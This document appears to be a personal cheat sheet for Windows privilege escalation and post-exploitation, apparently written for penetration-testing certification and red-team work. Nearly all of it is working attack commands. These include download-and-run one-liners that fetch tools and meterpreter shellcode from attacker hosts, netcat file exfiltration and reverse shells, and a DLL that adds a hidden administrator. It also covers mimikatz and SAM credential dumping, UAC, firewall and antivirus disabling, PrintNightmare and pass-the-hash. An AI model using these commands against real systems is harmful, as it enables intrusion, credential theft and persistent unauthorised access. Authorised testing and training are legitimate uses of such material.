# Basics

## Enum

### Automated enum

https://github.com/itm4n/PrivescCheck/

The script there is obfuscated but additional levels of obfuscation are welcome.

1. `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"`
2. Run manual commands if needed 
3. If windows version is old then try potatoes if privileges are there

### Manual enum

```powershell

# see script exec policy

Get-ExecutionPolicy -Scope CurrentUser

# set to unrestricted

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# see user's history
Get-History

# check PSReadline history
$psReadlineOptions = Get-PSReadlineOption; $historySavePath = $psReadlineOptions.HistorySavePath; if (Test-Path $historySavePath) { Get-Content $historySavePath } else { Write-Host "PS History File does not exist" }

# check event, for blocked scripts for example

Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Where-Object { $_.Message -like '*script block*' } | Format-List

# get into temp dir which is typically writable
cd $env:temp

systeminfo

Get-ComputerInfo

# search for interesting files

Get-ChildItem -Path .\ -Include  *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.ini -File -Recurse -ErrorAction SilentlyContinue

# in cmd 
dir /s /b flag.txt

# see also hidden files
Get-ChildItem . -Force

# download stuff if needed
iwr -uri http://IP -outfile some.exe

# test locally connections
Test-NetConnection -Port 445 192.168.50.111

# run x86 version of powershell from cmd.exe

%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

```

### Helpful stuff

```powershell

#reboot

shutdown /r /t 0

# RDP into machine

`xfreerdp /cert:ignore /dynamic-resolution /clipboard /auto-reconnect /d:domain.com /u:jeff /p:'HenchmanPutridBonbon11' /v:192.168.244.75`

# use `/pth:` for pass the hash

net user

Get-LocalUser

# get list of local groups
Get-LocalGroup

net localgroup

# get group members of SomeGroup
Get-LocalGroupMember SomeGroup

net localgroup SomeGroup

# cmd

wmic product get name, version


# all

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 32 bit

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64 bit

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process | Select-Object ProcessName, Path

Get-Process -Name | Get-Acl

Get-Process | ForEach-Object { $_.Path } 


```

### NetBIOS

NetBIOS Name is a 16-byte name for a networking service or function on a machine running Microsoft Windows Server. NetBIOS names are a more friendly way of identifying computers on a network than network numbers.

* local: `nbtstat -n`

* remote scan: `sudo nmap -sU --script nbstat.nse -p137 <host>`

### PowerSploit

* PowerSploit is extramely useful for actions on objective after reconaissance with `Privesc`
* Each single Module can accessed as so after hosting the directory
* for more info see: https://resources.infosecinstitute.com/topic/powershell-toolkit-powersploit/

```powershell
IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/CodeExecution/Invoke-Shellcode.ps1”)

Get-Help Invoke-Shellcode

Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.14 -Lport 4444 -Force

```

Following metasploit payloads are supported

```bash
windows/meterpreter/reverse_http
windows/meterpreter/reverse_https
```

### Basic usage
* start PS from cmd bypassing the execution policy: `powershell -ep bypass`
* importing modules is possbile with dot notation: `. .\PowerView.ps1`



## UAC bypass

* check UAC in cmd: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`

* find out UAC level: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`

* UAC can be bypassed using https://github.com/turbo/zero2hero
OR 

```powershell

#turn of UAC triggering a scheduled task

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0'
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName "DisableUAC" -Action $action -Trigger $trigger -Principal $principal


```

## Antivirus bypass

### Detect AV Version

* works with PS 3.0 and higher
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

### TBD bypass 


## Download and Upload stuff

```powershell

# enable SMBv1
# this is going to be helpful to start file transfers
# on compromised machine

Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"

#copy

copy share_path target_dir

#example 

copy c:\test '\\192.168.219.100\share_name'

# use

net use \\server /user:domain\username password

#execute PEs

 & \\192.168.119.169\tools\Rubeus.exe triage

```


1. `certutil -urlcache -split -f http://source.ip/payload.exe payload.exe`
2. Download the file in PS: 
`Invoke-WebRequest -Uri "url" -OutFile "dest"`
`curl http://xxx/file.xxx -o file.xxx`
3. Download and execute in PS: 
`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"`

or just `IEX(New-Object Net.WebClient).DownloadString('URL')`

use netcat

`cmd.exe /C "nc64.exe 192.168.219.137 443 < systeminfo.txt"`

* Powershell

```
#run receiver on listener

nc -lvnp 443 > output.xxx

#send file
Get-Content file.xxx | .\nc.exe IP PORT

#bypass execution policy  if got admin
Set-ExecutionPolicy Unrestricted
```

```powershell
# For older Systems use Sherlock
powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"

powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1'); Invoke-AllChecks"

```

## Find Stuff

Look for passwords

`dir /s *pass* == *.config`

`Get-ChildItem -Path "C:\YourDirectory" -Recurse -File | Select-String -Pattern "password"`

If found then search in the directory for strings within files

`findstr /si password *.xml *.ini *.txt`


* Primary option: PowerView.ps1

```cmd
dir /a:h C:\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

```powershell

. .\PowerView.ps1

Find-InterestingFile -Path \\FileServer1.domain.com\S$\shares\

```

* cmd: `dir /s /b c:\filename` find filename in c: drive recursively
* ps: `Get-ChildItem -Path c:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

In the users folder look for more extensions

```powershell

Get-ChildItem -Path .\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### Recycle Bin // TBD

* access recycle bin items

```
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```


## DPAPI

Or just use `https://github.com/login-securite/DonPAPI`

```powershell

#find DPAPI credentials


Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\

# Get credentials info using mimikatz 
powershell  -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString('https://ip.attqacker/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'dpapi::cred /in:C:\Users\<USER>\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D exit'

# locate guidMasterKey

Get-ChildItem -Hidden C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>

# make sure to have AD binding

dpapi::masterkey /in:"C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<USER SID>\<guidMasterKey>" /rpc

# use extracted master key to decrypt credential file

mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:0c0...very long ...f

```

Everything is easy if you are local admin

`sekurlsa::dpapi`





## Services

### Access Control check

UAC rights show if the user can read or write files.

Use accesscheck from sysinternals

`accesschk.exe /accepteula`

Check access

`.\accesschk.exe /accepteula -uwcqv user c:\`


### Insecure Service Properties

Dangerous permissions: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS

Enumerate service with winpeas

`winpeas.exe quiet servicesinfo`


Configuration query
`sc.exe qc <name>`

Status query
`sc.exe query <name>`

Check rights of the user on service

```powershell
# use accesschk

PS C:\Temp> .\accesschk.exe /accepteula -ucqv regsvc

R  regsvc
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG # ask the config
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START # we can start
	SERVICE_STOP # we can stop
	READ_CONTROL

```

Modify options
`sc.exe config <name> <options>= <value>`
i.e. `sc config daclsvc binpath= "\"c:\PrivEsc\rev.exe\""`

Official list of parameters: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config

Start/Stop Service
`net start/stop <name>`
i.e. 'net start daclsvc' 



RABBIT HOLE: Make sure you can restart the service or machine to make changes active!

`accesschk.exe /accepteula -ucqv servicename`

## Unquoted Service Path

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell

# any unquoted services?
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx:8080/PowerUp.ps1'); Invoke-AllChecks

# find folders with write access
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.xxx:8080/ChkUnqPath.ps1'); Test-WriteAccess -FolderPath "C:\path with some\spaces here\"

```


## Weak Registry Permissions

First, check

```powershell
# check registry permissions of a service for HKLM\system\currentcontrolset\services\regsvc

PS C:\Temp> Get-Acl HKLM:\system\currentcontrolset\services\regsvc | Format-List
Get-Acl HKLM:\system\currentcontrolset\services\regsvc | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)

# OR same with accesschk.exe

.\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc

# we see that NT AUTHORITY\INTERACTIVE has full control
# all localy logged in users are part of the INTERACTIVE GROUP
# So changing this registry entry can allow users to perform privileged actions
```

Now, check current reistry values for interesting entries

```powershell
PS C:\Temp> reg query HKLM\system\currentcontrolset\services\regsvc

HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe" #looks interesting
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

```

Replace registry entry with your own

```powershell

reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\user\AppData\Local\Temp\priv\rev4444.exe" /f

The operation completed successfully.
```

Now just start the service again and await reverse shell.



## Hijacking

### Binary

1. Find running services

```powershell

# check for running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# check for privileged services

Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName,StartMode | Where-Object {$_.State -like 'Running' -and ($_.StartName -like '*LocalSystem' -or $_.StartName -like 'NT AUTHORITY')}

# check specific service

# using Where-Object {$_.Name -like 'mysql'}

Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName,StartMode | Where-Object {$_.Name -like 'service0815'}

```

Alternativekly use powerups funtion `Get-ModifiableServiceFile`.

2. Find writable binary 

```powershell

Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like 'Running'} | ForEach-Object { $path = $_.PathName -replace '^"([^"]*)".*$','$1' -replace '^(.*\.exe).*','$1'; Write-Output "Permissions for $path"; & icacls $path }


```

3. Replace writable binary with a malicious one
4. Restart service or Reboot the machine

### Autostart exploit

1. Find autostart executables

```powershell

Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -Property Command, Description, User, Location

```

OR via cmd registry

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

```

2. Check if they are writeable

```cmd
accesschk.exe /accepteula -wvu "PATH/to/prog.exe"

icacls <Path>
#look for (F/M/W) as full access

```

or powershell

```powershell

Get-ChildItem C:\temp\ -Recurse | Get-Acl
# now look for Everyone
```

3. Overwrite the original executable and wait for shell at system restart

### Exploiting .msi with AlwaysInstallElevated

1. Detect
`winpeas.exe  quite windowscreds`

2. If `AlwaysInstallElevated set to 1 in HKLM or HKCU!` then it is exploitable

3. create malicious msi rev shell `-f msi` and execute it on victim

## DLL hijacking

1. Identify missing DLL using procmon
2. crorss-compile malicious dll and place in working folder

```cpp
// x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

```


3. restart service/ reboot PC

DLL is going to be searched by OS in following order.

```log

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

```


## Passwords compromise

### Passwords in Registry

Run winpeas

```powershell

winpeas.exe quiet filesinfo userinfo

```

or manually with cmd

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

#or single registries

reg query "HKLM\Software\...\winlogon"

```

## RunAs Saved Creds

Discover `winpeas.exe quiet cmd windowscreds`

`cmdkey /list`

Exploit:

`runas /savecred /user:admin C:\PrivEsc\reverse.exe`




## dump password hashes


reg save HKLM\SAM C:\wamp64\attendance\images\test\SAM
reg save HKLM\SYSTEM C:\wamp64\attendance\images\test\SYSTEM


`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`

OR user mimikatz

```cmd

lsadump::lsa /patch

```
`cme smb ms01.xxx.xxx -u Administrator -p xxx  --lsa --local-auth`

`cme smb ms01.xxx.xxx -u Administrator -p xxx  --sam --local-auth`

* crack NTLM if needed `hashcat -m 1000 --force hash /wordlist`

OR even better login directly win pth-winexe

```powershell

# where hash must include the LM part too
pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' --system //192.168.111.xxx cmd.exe
```

## Scheduled Tasks compromise

* Discovery

`schtasks /query /fo LIST /v`

or 

``` powershell

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
```

* Find scripts use by scheduled task
* Check permissions on script or exe 

```cmd
icacls C:\Users\user101\Cleanup.exe

```

* If writeable, replace this script with a malicious executable to obtain reverse shell

* Wait until task executes

## Insecure GUI Apps

* find an app with GUI file access ran by admin

```cmd

tasklist /V | findstr admin_GUI.exe

```

* once found that app, click on "Open File..." and type in the navigation bar on top of the window `file://c:/windows/system32/cmd.exe`

## Startup Folder compromise

* System startup folder is located in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` and if shortcut .lnk is place wihin then program linked shall autostart at reboot.

* This can be exploited by creating and launching a .vbs script and waiting until admin logs in 

```vbs
# create_shortcut.vbs

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

* Activate this script `cscript create_shortcut.vbs`
* Wait for admin

## Non MS Apps exploitation

* On ExploitDB select `Windows -> Apps -> Privesc -> Has App`
* Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
* find the exploit on `exploit.db` as shown above

## User impersonation

```powershell
## SU ON WINDOWS = runas

C:\Windows\System32\runas.exe /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

# IF THE USER SAVED THE CREDENTIALS
C:\Windows\System32\runas.exe /savecred /user:<username> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

# using powershell

$securePassword = ConvertTo-SecureString -String "Password123" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList 'user101', $securePassword

Start-Process powershell.exe -Credential $credential

# it is going to start a new window with powershell as compromised user

```

## Token Impersonation

Use potatoes wisely

SeImpersonatePrivilege enabled?

```text

Find out the version based on build in here https://en.wikipedia.org/wiki/Windows_10_version_history

Windows 7 – Windows 10 / Server 2016 version 1803 –> Juicy Potato
Windows 10 / Server 2016 version 1607 – Windows 10 / Server 2019 present –> Print Spoofer
Windows 10 / Server 2019 version 1809 – present –> Rogue Potato
```

* This shall tipically work if following privileges are available `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`

`juicypotato.exe -l 1333 -p C:\path\to\shellfile\rev1337.exe -t * -c "{6d18ad12-bde3-4393-b311-099c346e6df9}"`

But there are also more thechniques such as printspoofer: https://juggernaut-sec.com/seimpersonateprivilege/


```powershell

## TOKEN IMPERSONATION
# IN METERPRETER SESSION ON THE COMPROMISED WINDOWS HOST

load incognito
list_tokens -u
# CHOSE A DOMAIN ADMIN WHICH YOU WANT TO IMPERSONATE

impersonate_token domain\\username

```

## PrintSpoofer

Find vulenrable RPC

`rpcdump.py <HOST-IP>  | grep -A 6 MS-RPRN`

or 

```bash
# Check open pipes
rpcdump.py <HOST-IP> | egrep 'MS-RPRN|MS-PAR'

# Create a DLL payload (reverse shell in this example)
msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll

# Host a SMB share 
smbserver.py -smb2support "WHATEVERNAME" /workspace/smb/

# Start the listener (for the reverse shell)
nc -lvnp $LOCAL_PORT

# Run the exploit
CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll'

#thanks 2 https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare
```

Windows Version 1607 onwards

```powershell

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O PrintSpoofer.exe

.\PrintSpoofer.exe -i -c "c:\Temp\rev_shell.exe"
```

* needs `vc_redist.x64.exe` and `vcruntime140.dll`, if failes



# Certificate exploits

UPDATE: better use `https://github.com/ly4k/Certipy`

* PKI might be badly configured
* exploit it using Certify.exe tool for recon and certificate forging

```bash
# see github for more info
Certify.exe find /vulnerable

#altname is the account for impersonation
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

#Copy the  -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- section to a file on Linux/macOS, and run the openssl #command to convert it to a .pfx. When prompted, don't enter a password:


openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx

#saving blob to ticket.64

tr -d '\n' < ticket.64 | tr -d ' '

# then just use ccache and call impackets psexec
impacket-psexe -no-pass -k target cmd


```

## Kernel Exploits

* User Kernel only as last resort to Windows PrivEsc

* Exploit suggesters

* Older systems:

```cmd
# If your ps1 file is downloaded 

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"

c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

* New systems (more stealthy):

1. wseng
`https://github.com/bitsadmin/wesng`

`python wes.py --update`

`python wes.py ~/Sandbox/Winodows_PrivEsc/systeminfo.txt --exploits-only`

2. Use pre-compiled binaries
`https://github.com/SecWiki/windows-kernel-exploits`

3. Watson for older systems

## RPC

* Dump services

`impacket-rpcdump TARGET_IP`

* Map RPC service
`impacket-rpcmap -no-pass -target-ip TARGET_IP ncacn_np:\\JEFF[\PIPE\atsvc]`

## wmic 

* If you got creds and WMI is open on the target (only older machines), gain RCE using wmic on win host locally

`wmic /node:192.168.50.xxxx /user:bob101 /password:Password! process call create "calc"`

* Same on powershell

```powershell

$username = 'user101';
$password = 'Password!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;


$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.xx.xxx -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

```


* Or remotely using winrs on windows

```powershell

winrs -r:pc_name -u:user101 -p:Password!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

```

## WinRM

* attack from local  host

```powershell

$username = 'user101';
$password = 'Password!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# Enter-PSSession is alternative
New-PSSession -ComputerName 192.168.xx.xx -Credential $credential

```


## Meterpreter
This shell works even on Windows 11 but needs MSF

1. SMB delivery: `use windows/smb/smb/delivery`
2. Payload: `set payload windows/meterpreter/reverse_tcp`
3. Configure all options in MSF and `exploit`
4. During exploit execution MSF will ask you to run following on target machine: `rundll32.exe \\attacker_ip\PJSK\test.dll,0`
5. Select active session
6. Get shell: `shell`


## Exposed GPP Password

* impacket-Get-GPPPassword to get password
* gp3finder.py to crack password


## Compiling Exploits for Windows on Kali

1. install mingw `apt install mingw-w64`
2. Compile for 64 bit

```
x86_64-w64-mingw32-gcc shell.c -o shell.exe
```
3. Compile for 32 bit
```
i686-w64-mingw32-gcc shell.c -o shell.exe
```


## Use winexe

In kali there is winexe tool that allows running remote commands on windows

```bash
#to spawn remote cmd SYSTEM shell
winexe -U 'admin%password123' --system //192.168.1.xxx cmd.exe
```

## Port Forwarding from Windows

* Sometimes internal vulnerable ports need to be forwarded to Kali. For example for port 445 with SMB
* use `plink.exe`
* on kali enable root login on ssh `vim /etc/ssh/sshd_config` PermitRootLogin yes. Then `service ssh restart`
* ssh must be running
* Run forwarding `plink.exe root@192.168.1.10 -R 445:127.0.0.1:445` where first port is dest and second is source and ip source,
* now  use any tools and target `127.0.0.1:445` on kali machine like `winexe`


## Firewall tricks

* Shut off firewall
`netsh advfirewall set allprofiles state off`

* Get all FW rules

`Get-NetFirewallRule`


* Get firewall rules for blocking outbound

```
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

* Get Allow exceptions

```
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow

```


## MSSQL

Login using impacket

`impacket-mssqlclient Administrator@192.168.233.18 -windows-auth`



## Post exploitation

* Once Admin privileges obtained get SYSTEM shell
`psexec.exe -accepteula -sid cmd.exe`

Or connect as other service if needed from victim

```powershell

.\psexec.exe /accepteula -i -u "nt authority\local service" c:\rev_shell.exe
```

```powershell
# SET UAC TO 0
C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

# TURN OFF ANTIVIRUS (can be detected by EDRs!!! so use with caution!!!)
run killav

# enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# add user
net user Pentester Password1 /ADD

# give admin rights
net localgroup Administrators Pentester /ADD

# add to RDP group

powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""

net localgroup "Remote Desktop Users" Pentester /add

#* Enable winrm to be evil

Enable-PSRemoting -SkipNetworkProfileCheck -Force

#OR

winrm quickconfig -y

# new SMB share

New-SmbShare -Name "wapa" -Path "C:\wapa"

```

## Obfuscation

This is not needed for OSCP, but is needed for Red Team engagements.

* Obfuscation in general: https://attack.mitre.org/techniques/T1027/010/
* Command line obfuscation: https://github.com/wietze/Invoke-ArgFuscator or https://argfuscator.net/about.html
